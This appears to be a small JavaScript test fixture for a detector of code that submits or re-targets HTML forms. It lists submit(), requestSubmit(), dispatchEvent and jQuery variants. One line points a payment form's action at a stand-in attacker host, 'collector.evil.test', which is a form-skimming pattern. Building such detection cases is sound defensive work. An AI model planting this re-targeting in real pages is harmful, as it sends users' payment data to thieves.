// Task 11: forms submitted or re-targeted from code.
document.forms[0].submit();
document.getElementById("login").submit();
form.requestSubmit();
document.forms["pay"].action = "https://collector.evil.test/pay.php";
form.setAttribute("action", "/next");
form.dispatchEvent(new Event("submit"));
$("#login").trigger("submit");
$("#login").submit();
// a jQuery submit HANDLER is a listener, not a submission
$("#login").submit(function () { return check(); });
